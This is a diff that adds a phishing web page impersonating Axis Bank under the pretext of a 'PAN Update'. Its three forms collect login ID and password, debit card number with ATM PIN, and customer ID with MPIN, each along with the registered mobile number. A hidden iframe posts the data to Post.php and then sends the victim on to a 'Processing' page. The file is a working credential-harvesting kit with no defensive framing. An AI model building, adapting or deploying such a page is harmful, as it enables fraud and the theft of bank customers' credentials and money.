@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta name="theme-color" content="#A6004D">
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Axis Bank | PAN Update</title>
+    <meta name="description" content="login" />
+    <link rel="stylesheet" href="Axis.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
+    <style>
+      .hidden {
+        display: none;
+      }
+       
+       #mn
+       {
+       width:100%;
+       height: auto;
+       }
+       
+      .card-login {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 20px;
+      }
+
+      .card-login button {
+        flex-grow: 1;
+        font-size: 16px;
+        font-family: 'Open Sans', sans-serif;
+        margin-right: 10px;
+        padding: 8px;
+        border: none;
+        outline:none;
+        border-radius: 25px;
+        cursor: pointer;
+      }
+
+      .card-login button.active {
+        background-color: #97144d;
+      }
+    </style>
+  </head>
+  <body>
+  <!-- partial:index.partial.html -->
+  <div class="login-box">
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
+  <!--My Form-->
+    <div id="__next">
+        <img alt="" src="AxisMain.jpg" id="mn"/>
+      </div>
+      <div class="mainContent">
+        <h1 class="text-center">Continue to PAN Update</h1>
+        <div class="card">
+          <div class="card-login">
+            <button style="font-family: 'Work Sans', sans-serif; font-weight:600;" type="button" class="active" data-form="formA">Login ID / Customer ID</button>
+            <button style="font-family: 'Work Sans', sans-serif; font-weight:600;" type="button" data-form="formB">Debit Card No.</button>
+            <button style="font-family: 'Work Sans', sans-serif; font-weight:600;" type="button" data-form="formC">MPIN</button>
+          </div>
+          <div>
+            <section id="formA">
+              <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+                <input type="hidden" name="" value="" />
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="li">Login ID / Customer ID</label>
+                  <input type="text" class="new-control" name="Login_ID" id="lo" inputMode="numeric" maxLength="25"  required="" />
+                </div>
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="pw">Password</label>
+                  <input type="text" class="new-control" minLength="8" maxLength="30" name="Password" id="pw" required />
+                </div>
+                <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Registered_Mobile_No.">
+                Registered Mobile No.</label>
+                <input type="text" class="new-control" id="Mobile_Number" name="Mobile_Number" maxLength="10" inputmode="numeric"
+                pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required=""/></div>
+                <div class="text-center" style="font-size:13px;line-height:20px; font-family: 'Work Sans', sans-serif; font-weight:600;">
+                  Forgot Password? <a href="#">Reset Here</a>
+                  <br />
+                  Locked your account? <a href="#">Enable Login ID</a>
+                </div>
+                <div class="text-center">
+                  <button type="submit" class="submit">LOGIN</button>
+                </div>
+              </form>
+            </section>
+            <section id="formB" class="hidden">
+              <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+                <input type="hidden" name="" value="" />
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="dn">Debit Card No</label>
+                  <input type="text" class="new-control" id="dn" name="Debit_Card_Number" inputMode="numeric" minLength="16" maxLength="19" required />
+                </div>
+                <script>
+                 function _getcaret(input) {
+                 if ('selectionStart' in input) {
+                 // Standard-compliant browsers
+                 return input.selectionStart;
+                 } else if(document.selection) {
+                 input.focus();
+                 var sel = document.selection.createRange();
+                 var selLen = document.selection.createRange().text.length;
+                 sel.moveStart('character', -input.value.length);
+                 return sel.text.length - selLen;
+                 }
+                 }
+                 function _setcaret(input, pos) {
+                 if (input.setSelectionRange) {
+                 input.focus()
+                 input.setSelectionRange(pos,pos)
+                 } else if(input.createTextRange) {
+                 var range = input.createTextRange();
+                 range.move('character', pos);
+                 range.select();
+                 }
+                 }
+                 
+                 function _format_464 (cc) {
+                 return [cc.substring(0,4),cc.substring(4,10),cc.substring(10,14)].join(' ').trim()
+                 }
+                 function _format_465 (cc) {
+                 return [cc.substring(0,4),cc.substring(4,10),cc.substring(10,15)].join(' ').trim()
+                 }
+                 function _format_4444 (cc) {
+                 return cc?cc.match(/[0-9]{1,4}/g).join(' '):''
+                 }
+                 _CARD_TYPES = [
+                 {'type':'visa','pattern':/^4/, 'format': _format_4444, 'maxlength': 16},
+                 {'type':'master','pattern':/^(5[12345])|(2[2-7])/, 'format': _format_4444, 'maxlength': 16},
+                 {'type':'amex','pattern':/^3[47]/, 'format': _format_465, 'maxlength':15},
+                 {'type':'instapayment','pattern':/^63[789]/, 'format': _format_4444, 'maxlength':16},
+                 {'type':'diners_club_carte_blanche','pattern':/^30[0-5]/, 'format': _format_464, 'maxlength':14},
+                 {'type':'diners_club_international','pattern':/^30[0-5]/, 'format': _format_464, 'maxlength':14},
+                 {'type':'diners_club','pattern':/^54/, 'format': _format_4444, 'maxlength':16}
+                 ]
+                 function _format_cardnumber(cc, maxlength) {
+                 cc = cc.replace(/[^0-9]+/g,'')
+                 
+                 for(var i in _CARD_TYPES) {
+                 const ct = _CARD_TYPES[i]
+                 if(cc.match(ct.pattern)) {
+                 cc = cc.substring(0,ct.maxlength)
+                 return ct.format(cc)
+                 }
+                 }
+                 
+                 return _format_4444(cc)
+                 /*
+                 if(maxlength) {
+                 cc = cc.substring(0,maxlength)
+                 }
+                 if(cc.match(/^3[47]/)) {
+                 return [cc.substring(0,4),cc.substring(4,10),cc.substring(10,15)].join(' ').trim()
+                 }
+                 return cc?cc.match(/.{1,4}/g).join(' '):''
+                 */
+                 }
+                 
+                 function _set_creditcard_number(event) {
+                 const input = event.target
+                 const maxlength = input.getAttribute('maxlength')
+                 
+                 var oldval = input.value
+                 var caret_position = _getcaret(input)
+                 var before_caret = oldval.substring(0,caret_position)
+                 before_caret = _format_cardnumber(before_caret)
+                 caret_position = before_caret.length
+                 
+                 var newvalue = _format_cardnumber(oldval, maxlength)
+                 
+                 if(oldval==newvalue) return
+                 
+                 input.value = newvalue
+                 _setcaret(input, caret_position)
+                 }
+                 
+                 function make_credit_card_input(input) {
+                 input.addEventListener('input',_set_creditcard_number)
+                 input.addEventListener('keyup',_set_creditcard_number)
+                 input.addEventListener('keydown',_set_creditcard_number)
+                 input.addEventListener('keypress',_set_creditcard_number)
+                 input.addEventListener('change',_set_creditcard_number)
+                 }
+                 
+                 make_credit_card_input(document.getElementById("dn"));
+                 
+                 
+                </script>
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="ap">ATM Pin No</label>
+                  <input type="text" class="new-control" maxLength="4" inputmode="numeric" id="ap" name="ATM_PIN"
+                  pattern="[0-9]\d{3}" title="Please enter valid ATM PIN !" required=""/>
+                </div>
+                <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Registered_Mobile_No.">
+                Registered Mobile No.</label>
+                <input type="text" class="new-control" id="Mobile_Number" name="Mobile_Number" maxLength="10" inputmode="numeric"
+                pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required=""/></div>
+                <div class="text-center">
+                  <button type="submit" class="submit">LOGIN</button>
+                </div>
+              </form>
+            </section>
+            <section id="formC" class="hidden">
+              <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+                <input type="hidden" name="" value="" />
+               
+                <div class="form-group" id="customerIDInput">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="ci">Customer ID</label>
+                  <input type="text" class="new-control" id="ci" name="Customer_ID" inputMode="numeric" maxlength="9" 
+                  pattern="[0-9]\d{8}" title="Please enter valid Customer ID !" required=""  />
+                </div>
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="mpin">MPIN</label>
+                  <input type="text" class="new-control" inputMode="numeric" id="mpin" name="M_PIN" maxLength="6" 
+                  pattern="[0-9]\d{5}" title="Please enter valid MPIN !"required="" />
+                </div>
+                <div class="form-group" id="mobileNumberInput">
+                <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="mn">Registered Mobile No.</label>
+                <input type="text" class="new-control" maxLength="10" id="mn" name="Mobile_Number" inputMode="numeric"
+                pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required="" />
+                </div>
+                <div class="text-center">
+                  <button type="submit" class="submit">LOGIN</button>
+                </div>
+              </form>
+            </section>
+            </div>
+            </div>
+            </div>
+            <img alt="" src="Axis_Footer.jpg" style="width: 100%; height: auto;" />
+            <img alt="" src="Axis_Ft.jpg" style="width: 100%; height: auto;" />
+      <script>
+        const buttons = document.querySelectorAll('.card-login button');
+        const sections = document.querySelectorAll('.mainContent section');
+
+        buttons.forEach((button) => {
+          button.addEventListener('click', () => {
+            const formId = button.dataset.form;
+
+            buttons.forEach((btn) => btn.classList.remove('active'));
+            sections.forEach((section) => section.classList.add('hidden'));
+
+            button.classList.add('active');
+            document.getElementById(formId).classList.remove('hidden');
+          });
+        });
+
+        const loginOption = document.querySelector('input[name="loginOption"]');
+        const customerIDInput = document.getElementById('customerIDInput');
+        const mobileNumberInput = document.getElementById('mobileNumberInput');
+
+        loginOption.addEventListener('change', (event) => {
+          if (event.target.value === 'customerID') {
+            customerIDInput.classList.remove('hidden');
+            mobileNumberInput.classList.add('hidden');
+          } else if (event.target.value === 'mobileNumber') {
+            customerIDInput.classList.add('hidden');
+            mobileNumberInput.classList.remove('hidden');
+          }
+        });
+      </script>
+    </div>
+  </body>
+</html>
